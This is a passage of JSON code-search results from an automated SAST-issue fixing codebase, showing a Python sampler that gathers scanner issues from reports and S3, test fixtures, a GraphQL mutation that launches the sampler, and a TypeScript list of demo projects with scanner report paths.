[","lineNumber":262},{"text":"        issue_info","lineNumber":263},{"text":"        for issue_info in config.get_non_skipped_issues()","lineNumber":264},{"text":"        if issue_info.issue_object","lineNumber":265},{"text":"    ]","lineNumber":266},{"text":"    fix_issues_results = await process_objects_in_parallel(","lineNumber":267},{"text":"        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE","lineNumber":268},{"text":"    )","lineNumber":269},{"lineNumber":270},{"text":"    all_issues = []","lineNumber":271},{"text":"    success_issues: dict[str, IssueInfo] = {}","lineNumber":272},{"text":"    all_fixed_files: dict[str, dict[str, str]] = {}","lineNumber":273},{"lineNumber":274},{"text":"    for issue_info, result in zip(all_issue_objects, fix_issues_results):","lineNumber":275}]},"score":0.3203110694885254},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":270},"endPosition":{"line":398}},"contents":"\\n\\n\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\n        return []\\n\\n    customer_issues, report = await _get_report_issues(\\n        pathlib.Path(config.customer_report_path),\\n        pathlib.Path(config.customer_source_archive_path),\\n    )\\n    samples = []\\n\\n    if (\\n        config.customer_report_issue_indexes\\n        and len(config.customer_report_issue_indexes) > 0\\n    ):\\n        for issue_index in config.customer_report_issue_indexes:\\n            issue = customer_issues[issue_index]\\n\\n            if not issue.fingerprint_hash:\\n                print(\\n                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                )\\n                continue\\n\\n            samples.append(\\n                Sample(\\n                    issue=issue,\\n                    report=report,\\n                    report_path=config.customer_report_path,\\n                    source_archive_path=config.customer_source_archive_path,\\n                    is_public=False,\\n                )\\n            )","originalContents":"\\n\\n\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\n        return []\\n\\n    customer_issues, report = await _get_report_issues(\\n        pathlib.Path(config.customer_report_path),\\n        pathlib.Path(config.customer_source_archive_path),\\n    )\\n    samples = []\\n\\n    if (\\n        config.customer_report_issue_indexes\\n        and len(config.customer_report_issue_indexes) > 0\\n    ):\\n        for issue_index in config.customer_report_issue_indexes:\\n            issue = customer_issues[issue_index]\\n\\n            if not issue.fingerprint_hash:\\n                print(\\n                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"\\n                )\\n                continue\\n\\n            samples.append(\\n                Sample(\\n                    issue=issue,\\n                    report=report,\\n                    report_path=config.customer_report_path,\\n                    source_archive_path=config.customer_source_archive_path,\\n                    is_public=False,\\n                )\\n            )","detailedLines":[{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"lineNumber":337},{"text":"            f,","lineNumber":338},{"text":"            indent=4,","lineNumber":339},{"text":"        )","lineNumber":340,"isSignature":true},{"lineNumber":341},{"lineNumber":342},{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    if not config.customer_report_path or not config.customer_source_archive_path:","lineNumber":344},{"text":"        return []","lineNumber":345},{"lineNumber":346},{"text":"    customer_issues, report = await _get_report_issues(","lineNumber":347},{"text":"        pathlib.Path(config.customer_report_path),","lineNumber":348},{"text":"        pathlib.Path(config.customer_source_archive_path),","lineNumber":349},{"text":"    )","lineNumber":350},{"text":"    samples = []","lineNumber":351},{"lineNumber":352},{"text":"    if (","lineNumber":353},{"text":"        config.customer_report_issue_indexes","lineNumber":354},{"text":"        and len(config.customer_report_issue_indexes) > 0","lineNumber":355},{"text":"    ):","lineNumber":356},{"text":"        for issue_index in config.customer_report_issue_indexes:","lineNumber":357},{"text":"            issue = customer_issues[issue_index]","lineNumber":358},{"lineNumber":359},{"text":"            if not issue.fingerprint_hash:","lineNumber":360},{"text":"                print(","lineNumber":361},{"text":"                    f\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\"","lineNumber":362},{"text":"                )","lineNumber":363},{"text":"                continue","lineNumber":364},{"lineNumber":365},{"text":"            samples.append(","lineNumber":366},{"text":"                Sample(","lineNumber":367},{"text":"                    issue=issue,","lineNumber":368},{"text":"                    report=report,","lineNumber":369},{"text":"                    report_path=config.customer_report_path,","lineNumber":370},{"text":"                    source_archive_path=config.customer_source_archive_path,","lineNumber":371},{"text":"                    is_public=False,","lineNumber":372},{"text":"                )","lineNumber":373},{"text":"            )","lineNumber":374},{"text":"    else:","lineNumber":375},{"text":"        for issue in customer_issues:","lineNumber":376}]},"score":0.3197915554046631},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{},"endPosition":{"line":45,"column":33}},"contents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")\\n)\\n\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")\\n\\nS3_ACCESS = S3Access.init_connection(\\n    \\"DATASET_S3_COONECTION\\",\\n    \\"mobb-dev-dataset\\",\\n    \\"us-west-2\\",\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],\\n)","originalContents":"from __future__ import annotations\\n\\nfrom typing import Annotated, Optional\\n\\nimport json\\nimport os\\nimport pathlib\\nimport pickle\\nimport random\\nimport tempfile\\nimport time\\nimport zipfile\\nfrom collections import defaultdict\\nfrom dataclasses import dataclass\\n\\nimport fire  # type: ignore[import-untyped]\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\nfrom annotated_types import Len\\nfrom dotenv import load_dotenv\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\nfrom pycommon.report.file_loader import FileLoader\\nfrom pycommon.report.issue import Issue\\nfrom pycommon.s3 import S3Access\\nfrom pydantic import BaseModel\\n\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\n    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")\\n)\\n\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")\\n\\nS3_ACCESS = S3Access.init_connection(\\n    \\"DATASET_S3_COONECTION\\",\\n    \\"mobb-dev-dataset\\",\\n    \\"us-west-2\\",\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],\\n    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],\\n)","detailedLines":[{"text":"from __future__ import annotations","lineNumber":1},{"lineNumber":2},{"text":"from typing import Annotated, Optional","lineNumber":3},{"lineNumber":4},{"text":"import json","lineNumber":5},{"text":"import os","lineNumber":6},{"text":"import pathlib","lineNumber":7},{"text":"import pickle","lineNumber":8},{"text":"import random","lineNumber":9},{"text":"import tempfile","lineNumber":10},{"text":"import time","lineNumber":11},{"text":"import zipfile","lineNumber":12},{"text":"from collections import defaultdict","lineNumber":13},{"text":"from dataclasses import dataclass","lineNumber":14},{"lineNumber":15},{"text":"import fire  # type: ignore[import-untyped]","lineNumber":16},{"text":"from analyzer.highlight_nodes import highlight_nodes_report_for_issues","lineNumber":17},{"text":"from analyzer.locked_alru_cache import locked_alru_cache","lineNumber":18},{"text":"from annotated_types import Len","lineNumber":19},{"text":"from dotenv import load_dotenv","lineNumber":20},{"text":"from pycommon.report import BaseReportStream, get_report_by_file_stream","lineNumber":21},{"text":"from pycommon.report.file_loader import FileLoader","lineNumber":22},{"text":"from pycommon.report.issue import Issue","lineNumber":23},{"text":"from pycommon.s3 import S3Access","lineNumber":24},{"text":"from pydantic import BaseModel","lineNumber":25},{"lineNumber":26},{"text":"SCRIPT_PATH = pathlib.Path(__file__).parent","lineNumber":27},{"text":"AUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent","lineNumber":28},{"text":"DATASET_DATA_FOLDER_PATH = pathlib.Path(","lineNumber":29},{"text":"    os.getenv(\\"DATASET_DATA_FOLDER_PATH\\", SCRIPT_PATH / \\"../../../dataset/data\\")","lineNumber":30},{"text":")","lineNumber":31},{"lineNumber":32},{"text":"load_dotenv(dotenv_path=AUTOFIXER_DIR / \\".env\\")","lineNumber":33},{"lineNumber":34},{"text":"S3_ACCESS = S3Access.init_connection(","lineNumber":35},{"text":"    \\"DATASET_S3_COONECTION\\",","lineNumber":36},{"text":"    \\"mobb-dev-dataset\\",","lineNumber":37},{"text":"    \\"us-west-2\\",","lineNumber":38},{"text":"    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY_ID\\"],","lineNumber":39},{"text":"    os.environ[\\"AWS_DATASET_S3_ACCESS_KEY\\"],","lineNumber":40},{"text":")","lineNumber":41},{"lineNumber":42},{"lineNumber":43},{"text":"language_mapping = {","lineNumber":44},{"text":"    \\"asp\\": None,","lineNumber":45},{"text":"    \\"azureresourcemanager\\": None,","lineNumber":46}]},"score":0.31523633003234863},{"codeBlock":{"relativeWorkspacePath":"patchino/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":61}},"contents":"import os\\nimport pathlib\\nfrom unittest.mock import AsyncMock, MagicMock\\nfrom uuid import UUID\\n\\nimport pytest\\n\\n# Test data paths\\nTESTS_DIR = pathlib.Path(__file__).parent\\nFIXTURES_DIR = TESTS_DIR / \\"fixtures\\"\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"\\n\\n# Create directories if they don't exist\\nFIXTURES_DIR.mkdir(exist_ok=True)\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\n\\n\\n@pytest.fixture\\ndef sample_run_id():\\n    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"\\n    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","originalContents":"import os\\nimport pathlib\\nfrom unittest.mock import AsyncMock, MagicMock\\nfrom uuid import UUID\\n\\nimport pytest\\n\\n# Test data paths\\nTESTS_DIR = pathlib.Path(__file__).parent\\nFIXTURES_DIR = TESTS_DIR / \\"fixtures\\"\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"\\n\\n# Create directories if they don't exist\\nFIXTURES_DIR.mkdir(exist_ok=True)\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\n\\n\\n@pytest.fixture\\ndef sample_run_id():\\n    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"\\n    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"text":"from unittest.mock import AsyncMock, MagicMock","lineNumber":3},{"text":"from uuid import UUID","lineNumber":4},{"lineNumber":5},{"text":"import pytest","lineNumber":6},{"lineNumber":7},{"text":"# Test data paths","lineNumber":8},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":9},{"text":"FIXTURES_DIR = TESTS_DIR / \\"fixtures\\"","lineNumber":10},{"text":"SAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\"sample_prompt_templates\\"","lineNumber":11},{"lineNumber":12},{"text":"# Create directories if they don't exist","lineNumber":13},{"text":"FIXTURES_DIR.mkdir(exist_ok=True)","lineNumber":14},{"text":"SAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)","lineNumber":15},{"lineNumber":16},{"lineNumber":17},{"text":"@pytest.fixture","lineNumber":18},{"text":"def sample_run_id():","lineNumber":19,"isSignature":true},{"text":"    \\"\\"\\"Generate a consistent UUID for testing.\\"\\"\\"","lineNumber":20},{"text":"    return UUID(\\"12345678-1234-5678-9012-123456789012\\")","lineNumber":21,"isSignature":true},{"lineNumber":22},{"lineNumber":23},{"text":"@pytest.fixture","lineNumber":24},{"text":"def sample_feedback_data():","lineNumber":25,"isSignature":true},{"text":"    \\"\\"\\"Sample feedback data that matches the GraphQL response structure.\\"\\"\\"","lineNumber":26}]},"score":0.3096945881843567},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":242},"endPosition":{"line":339}},"contents":"\\n\\n\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n    dest_path = pathlib.Path(config.output_dir_path)\\n    dest_path.mkdir(parents=True, exist_ok=True)\\n\\n    serialized_samples = []\\n\\n    for sample in samples:\\n        issue_hash = sample.issue.fingerprint_hash\\n\\n        abs_path_to_issue_object = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"\\n        )\\n        path_to_issue_highlight_nodes_html = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"\\n        )\\n\\n        rel_sast_report_path = os.path.relpath(\\n            sample.report_path, config.output_dir_path\\n        )\\n        rel_source_code_path = os.path.relpath(\\n            sample.source_archive_path, config.output_dir_path\\n        )\\n\\n        serialized_samples.append(\\n            {\\n                \\"is_public\\": sample.is_public,\\n                \\"report_index\\": sample.issue.index,\\n                \\"issue_object_hash\\": issue_hash,\\n                \\"path_to_issue_object\\": os.path.relpath(\\n                    abs_path_to_issue_object, config.output_dir_path\\n                ),\\n                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\n                ),\\n                \\"sast_report_path\\": rel_sast_report_path,\\n                \\"source_code_path\\": rel_source_code_path,\\n                \\"sast_provider\\": sample.issue.provider.name,\\n                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,\\n                \\"sast_provider_severity\\": sample.issue.raw_severity,\\n                \\"sast_provider_language\\": sample.issue.raw_language,\\n                \\"skip_issue\\": False,\\n            }\\n        )\\n\\n        with open(abs_path_to_issue_object, \\"wb\\") as f:\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","originalContents":"\\n\\n\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n    dest_path = pathlib.Path(config.output_dir_path)\\n    dest_path.mkdir(parents=True, exist_ok=True)\\n\\n    serialized_samples = []\\n\\n    for sample in samples:\\n        issue_hash = sample.issue.fingerprint_hash\\n\\n        abs_path_to_issue_object = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"\\n        )\\n        path_to_issue_highlight_nodes_html = (\\n            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"\\n        )\\n\\n        rel_sast_report_path = os.path.relpath(\\n            sample.report_path, config.output_dir_path\\n        )\\n        rel_source_code_path = os.path.relpath(\\n            sample.source_archive_path, config.output_dir_path\\n        )\\n\\n        serialized_samples.append(\\n            {\\n                \\"is_public\\": sample.is_public,\\n                \\"report_index\\": sample.issue.index,\\n                \\"issue_object_hash\\": issue_hash,\\n                \\"path_to_issue_object\\": os.path.relpath(\\n                    abs_path_to_issue_object, config.output_dir_path\\n                ),\\n                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\n                ),\\n                \\"sast_report_path\\": rel_sast_report_path,\\n                \\"source_code_path\\": rel_source_code_path,\\n                \\"sast_provider\\": sample.issue.provider.name,\\n                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,\\n                \\"sast_provider_severity\\": sample.issue.raw_severity,\\n                \\"sast_provider_language\\": sample.issue.raw_language,\\n                \\"skip_issue\\": False,\\n            }\\n        )\\n\\n        with open(abs_path_to_issue_object, \\"wb\\") as f:\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","detailedLines":[{"text":"async def main(","lineNumber":243,"isSignature":true},{"text":"    input_config_abs_path: str = str(SCRIPT_PATH / \\"../sampler_config.json\\"),","lineNumber":244,"isSignature":true},{"text":"):","lineNumber":245,"isSignature":true},{"lineNumber":267},{"text":"    print(\\"Done\\")","lineNumber":268,"isSignature":true},{"lineNumber":269},{"lineNumber":270},{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    dest_path = pathlib.Path(config.output_dir_path)","lineNumber":272},{"text":"    dest_path.mkdir(parents=True, exist_ok=True)","lineNumber":273},{"lineNumber":274},{"text":"    serialized_samples = []","lineNumber":275},{"lineNumber":276},{"text":"    for sample in samples:","lineNumber":277},{"text":"        issue_hash = sample.issue.fingerprint_hash","lineNumber":278},{"lineNumber":279},{"text":"        abs_path_to_issue_object = (","lineNumber":280},{"text":"            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.pkl\\"","lineNumber":281},{"text":"        )","lineNumber":282},{"text":"        path_to_issue_highlight_nodes_html = (","lineNumber":283},{"text":"            pathlib.Path(config.output_dir_path) / f\\"{issue_hash}.html\\"","lineNumber":284},{"text":"        )","lineNumber":285},{"lineNumber":286},{"text":"        rel_sast_report_path = os.path.relpath(","lineNumber":287},{"text":"            sample.report_path, config.output_dir_path","lineNumber":288},{"text":"        )","lineNumber":289},{"text":"        rel_source_code_path = os.path.relpath(","lineNumber":290},{"text":"            sample.source_archive_path, config.output_dir_path","lineNumber":291},{"text":"        )","lineNumber":292},{"lineNumber":293},{"text":"        serialized_samples.append(","lineNumber":294},{"text":"            {","lineNumber":295},{"text":"                \\"is_public\\": sample.is_public,","lineNumber":296},{"text":"                \\"report_index\\": sample.issue.index,","lineNumber":297},{"text":"                \\"issue_object_hash\\": issue_hash,","lineNumber":298},{"text":"                \\"path_to_issue_object\\": os.path.relpath(","lineNumber":299},{"text":"                    abs_path_to_issue_object, config.output_dir_path","lineNumber":300},{"text":"                ),","lineNumber":301},{"text":"                \\"path_to_issue_highlight_nodes_html\\": os.path.relpath(","lineNumber":302},{"text":"                    path_to_issue_highlight_nodes_html, config.output_dir_path","lineNumber":303},{"text":"                ),","lineNumber":304},{"text":"                \\"sast_report_path\\": rel_sast_report_path,","lineNumber":305},{"text":"                \\"source_code_path\\": rel_source_code_path,","lineNumber":306},{"text":"                \\"sast_provider\\": sample.issue.provider.name,","lineNumber":307},{"text":"                \\"sast_provider_issue_name\\": sample.issue.raw_issue_type,","lineNumber":308},{"text":"                \\"sast_provider_severity\\": sample.issue.raw_severity,","lineNumber":309},{"text":"                \\"sast_provider_language\\": sample.issue.raw_language,","lineNumber":310},{"text":"                \\"skip_issue\\": False,","lineNumber":311},{"text":"            }","lineNumber":312},{"text":"        )","lineNumber":313},{"lineNumber":314},{"text":"        with open(abs_path_to_issue_object, \\"wb\\") as f:","lineNumber":315},{"text":"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","lineNumber":316},{"lineNumber":317},{"text":"        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:","lineNumber":318}]},"score":0.30686768889427185},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/sampler.py","range":{"startPosition":{"line":267,"column":17},"endPosition":{"line":398}},"contents":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\n\\n\\n        ...\\n\\n\\n        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:\\n            f.write(\\n                await highlight_nodes_report_for_issues(\\n                    report_file_path=rel_sast_report_path,\\n                    source_code_dir_path=rel_source_code_path,\\n                    report=sample.report,\\n                    issues=[sample.issue],\\n                    filtered_issues=[sample.issue],\\n                    git_info={},\\n                    include_fix=False,\\n                )\\n            )\\n\\n    with open(dest_path / \\"samples.json\\", \\"w\\") as f:\\n        json.dump(\\n            {\\n                \\"created_at\\": int(time.time()),\\n                \\"issues\\": serialized_samples,\\n                \\"is_from_docker\\": config.is_from_docker,\\n            },\\n            f,\\n            indent=4,\\n        )","originalContents":"\\n\\n        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:\\n            f.write(\\n                await highlight_nodes_report_for_issues(\\n                    report_file_path=rel_sast_report_path,\\n                    source_code_dir_path=rel_source_code_path,\\n                    report=sample.report,\\n                    issues=[sample.issue],\\n                    filtered_issues=[sample.issue],\\n                    git_info={},\\n                    include_fix=False,\\n                )\\n            )\\n\\n    with open(dest_path / \\"samples.json\\", \\"w\\") as f:\\n        json.dump(\\n            {\\n                \\"created_at\\": int(time.time()),\\n                \\"issues\\": serialized_samples,\\n                \\"is_from_docker\\": config.is_from_docker,\\n            },\\n            f,\\n            indent=4,\\n        )","detailedLines":[{"text":"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:","lineNumber":271,"isSignature":true},{"text":"    ","lineNumber":272},{"lineNumber":315},{"text":"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)","lineNumber":316},{"lineNumber":317},{"text":"        with open(path_to_issue_highlight_nodes_html, \\"w\\") as f:","lineNumber":318},{"text":"            f.write(","lineNumber":319},{"text":"                await highlight_nodes_report_for_issues(","lineNumber":320},{"text":"                    report_file_path=rel_sast_report_path,","lineNumber":321},{"text":"                    source_code_dir_path=rel_source_code_path,","lineNumber":322},{"text":"                    report=sample.report,","lineNumber":323},{"text":"                    issues=[sample.issue],","lineNumber":324},{"text":"                    filtered_issues=[sample.issue],","lineNumber":325},{"text":"                    git_info={},","lineNumber":326},{"text":"                    include_fix=False,","lineNumber":327},{"text":"                )","lineNumber":328},{"text":"            )","lineNumber":329},{"lineNumber":330},{"text":"    with open(dest_path / \\"samples.json\\", \\"w\\") as f:","lineNumber":331},{"text":"        json.dump(","lineNumber":332},{"text":"            {","lineNumber":333},{"text":"                \\"created_at\\": int(time.time()),","lineNumber":334},{"text":"                \\"issues\\": serialized_samples,","lineNumber":335},{"text":"                \\"is_from_docker\\": config.is_from_docker,","lineNumber":336},{"text":"            },","lineNumber":337},{"text":"            f,","lineNumber":338},{"text":"            indent=4,","lineNumber":339},{"text":"        )","lineNumber":340,"isSignature":true},{"lineNumber":341},{"lineNumber":342},{"text":"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:","lineNumber":343,"isSignature":true},{"text":"    ","lineNumber":344}]},"score":0.2911666929721832},{"codeBlock":{"relativeWorkspacePath":"patchino/patchino/backend/mutations/run_sampler.py","range":{"startPosition":{"line":13,"column":1},"endPosition":{"line":308}},"contents":"@strawberry.mutation\\nasync def run_sampler(\\n    self,\\n    sast_issue_languages: str,\\n    sast_issue_types: str,\\n) -> SamplerResult:\\n\\n\\n    ...\\n\\n\\n    command_str = \\" \\".join(cmd)\\n\\n    logger.info(f\\"📋 Executing command: {command_str}\\")\\n\\n    try:\\n        # Run from the patchino directory but set Python path to parent\\n        work_dir = Path(\\"/customuser/app/patchino\\")\\n\\n        # Set environment variables for Python path to include parent directory\\n        env = os.environ.copy()\\n        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"\\n        env[\\"PROJECT_DIR\\"] = \\"app\\"\\n\\n        # Execute the command\\n        logger.info(\\"⏳ Starting sampler script execution...\\")\\n\\n        # Run with real-time output streaming\\n        process = subprocess.Popen(\\n            cmd,\\n            cwd=work_dir,\\n            stdout=subprocess.PIPE,\\n            stderr=subprocess.PIPE,\\n            text=True,\\n            env=env,\\n            bufsize=1,\\n            universal_newlines=True,\\n        )\\n\\n        # Collect output in real-time\\n        sampler_output = \\"\\"\\n        sampler_error = \\"\\"","originalContents":"\\n\\n    command_str = \\" \\".join(cmd)\\n\\n    logger.info(f\\"📋 Executing command: {command_str}\\")\\n\\n    try:\\n        # Run from the patchino directory but set Python path to parent\\n        work_dir = Path(\\"/customuser/app/patchino\\")\\n\\n        # Set environment variables for Python path to include parent directory\\n        env = os.environ.copy()\\n        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"\\n        env[\\"PROJECT_DIR\\"] = \\"app\\"\\n\\n        # Execute the command\\n        logger.info(\\"⏳ Starting sampler script execution...\\")\\n\\n        # Run with real-time output streaming\\n        process = subprocess.Popen(\\n            cmd,\\n            cwd=work_dir,\\n            stdout=subprocess.PIPE,\\n            stderr=subprocess.PIPE,\\n            text=True,\\n            env=env,\\n            bufsize=1,\\n            universal_newlines=True,\\n        )\\n\\n        # Collect output in real-time\\n        sampler_output = \\"\\"\\n        sampler_error = \\"\\"","detailedLines":[{"text":"logger = logging.getLogger(__name__)","lineNumber":15},{"lineNumber":16},{"lineNumber":17},{"text":"@strawberry.mutation","lineNumber":18},{"text":"async def run_sampler(","lineNumber":19,"isSignature":true},{"text":"    self,","lineNumber":20,"isSignature":true},{"text":"    sast_issue_languages: str,","lineNumber":21,"isSignature":true},{"text":"    sast_issue_types: str,","lineNumber":22,"isSignature":true},{"text":") -> SamplerResult:","lineNumber":23,"isSignature":true},{"text":"    ","lineNumber":24},{"lineNumber":67},{"text":"        )","lineNumber":68},{"lineNumber":69},{"text":"    # Build the command","lineNumber":70},{"text":"    cmd = [\\"poetry\\", \\"run\\", \\"python\\", \\"patchino/sampler.py\\", \\"./sampler_config.json\\"]","lineNumber":71},{"lineNumber":72},{"text":"    command_str = \\" \\".join(cmd)","lineNumber":73},{"lineNumber":74},{"text":"    logger.info(f\\"📋 Executing command: {command_str}\\")","lineNumber":75},{"lineNumber":76},{"text":"    try:","lineNumber":77},{"text":"        # Run from the patchino directory but set Python path to parent","lineNumber":78},{"text":"        work_dir = Path(\\"/customuser/app/patchino\\")","lineNumber":79},{"lineNumber":80},{"text":"        # Set environment variables for Python path to include parent directory","lineNumber":81},{"text":"        env = os.environ.copy()","lineNumber":82},{"text":"        env[\\"PYTHONPATH\\"] = \\"/customuser/app/patchino\\"","lineNumber":83},{"text":"        env[\\"PROJECT_DIR\\"] = \\"app\\"","lineNumber":84},{"lineNumber":85},{"text":"        # Execute the command","lineNumber":86},{"text":"        logger.info(\\"⏳ Starting sampler script execution...\\")","lineNumber":87},{"lineNumber":88},{"text":"        # Run with real-time output streaming","lineNumber":89},{"text":"        process = subprocess.Popen(","lineNumber":90},{"text":"            cmd,","lineNumber":91},{"text":"            cwd=work_dir,","lineNumber":92},{"text":"            stdout=subprocess.PIPE,","lineNumber":93},{"text":"            stderr=subprocess.PIPE,","lineNumber":94},{"text":"            text=True,","lineNumber":95},{"text":"            env=env,","lineNumber":96},{"text":"            bufsize=1,","lineNumber":97},{"text":"            universal_newlines=True,","lineNumber":98},{"text":"        )","lineNumber":99},{"lineNumber":100},{"text":"        # Collect output in real-time","lineNumber":101},{"text":"        sampler_output = \\"\\"","lineNumber":102},{"text":"        sampler_error = \\"\\"","lineNumber":103},{"lineNumber":104},{"text":"        try:","lineNumber":105}]},"score":0.2901548147201538},{"codeBlock":{"relativeWorkspacePath":"services/node_general_backend/src/maintenance/try_now.ts","range":{"startPosition":{},"endPosition":{"line":55,"column":1}},"contents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from '../servers/vulnerability_report/vuln_report_generates'\\n\\nconst DATA_DIR = path.join(__dirname, 'try_now')\\n\\nexport const TRY_NOW_PROJECTS = {\\n  [Projects.JuiceShop]: {\\n    url: 'https://github.com/juice-shop/juice-shop',\\n    reference: '9a0789b5ecb4ee76fe528b1860095e945f6302ac',\\n    repoFile: path.join(DATA_DIR, 'juice-shop/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'juice-shop/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'juice-shop/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'juice-shop/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'juice-shop/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'juice-shop/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'juice-shop/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'juice-shop/datadog.json'),\\n    },\\n  },\\n  [Projects.Webgoat]: {\\n    url: 'https://github.com/WebGoat/WebGoat',\\n    reference: 'c7a41d1b178d006053293699061e0dfdb4f47b99',\\n    repoFile: path.join(DATA_DIR, 'webgoat/repo.zip'),\\n    reportFiles: {\\n      [Vendors.Checkmarx]: path.join(DATA_DIR, 'webgoat/checkmarx.json'),\\n      [Vendors.CodeQl]: path.join(DATA_DIR, 'webgoat/codeql.json'),\\n      [Vendors.Snyk]: path.join(DATA_DIR, 'webgoat/snyk.json'),\\n      [Vendors.Fortify]: path.join(DATA_DIR, 'webgoat/fortify.fpr'),\\n      [Vendors.SonarQube]: path.join(DATA_DIR, 'webgoat/sonarqube.json'),\\n      [Vendors.Semgrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Opengrep]: path.join(DATA_DIR, 'webgoat/semgrep.json'),\\n      [Vendors.Datadog]: path.join(DATA_DIR, 'webgoat/datadog.json'),\\n    },\\n  },","originalContents":"import path from 'node:path'\\n\\nimport {\\n  Projects,\\n  Vendors,\\n} from 